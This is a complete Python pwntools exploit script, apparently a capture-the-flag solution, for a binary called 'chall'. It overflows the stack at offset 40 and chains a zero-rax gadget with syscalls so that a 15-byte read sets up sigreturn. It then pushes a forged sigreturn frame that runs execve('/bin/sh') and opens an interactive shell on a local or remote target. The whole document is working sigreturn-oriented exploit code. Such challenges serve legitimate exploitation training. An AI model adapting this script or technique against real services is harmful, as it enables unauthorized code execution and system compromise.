#!/usr/bin/env python3

from pwn import *
from time import sleep

context.log_level = 'error'
context.binary = elf = ELF('../chall')
context.terminal = ['alacritty', '-e']

gs = """
b *super_program
continue
"""
if args.REMOTE:
    io = remote("localhost", 9000) # connects to docker, replace with actual remote if needed
elif args.GDB:
    io = gdb.debug('../chall', gdbscript=gs)
else:
    io = process()

context.log_level = 'info'

syscall = 0x401012  # syscall; ret 
zero_rax = 0x401058 # xor rax, rax; ret 
binsh = elf.sym.secret # string containing /bin/sh stored in the binary

offset = 40
payload = flat({offset: [
    zero_rax,
    syscall,
    syscall
]})

info("triggering read syscall with 15 chars to populate rax=15 -> sigreturn syscall")

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload += bytes(frame)
info("Pushing execve(\"/bin/sh\", NULL, NULL) sigreturn frame on the stack.")

io.sendline(payload)
sleep(0.5)
io.sendline(b'A'*14)

context.log_level = 'error'
io.interactive(prompt="shell> ")
io.close()
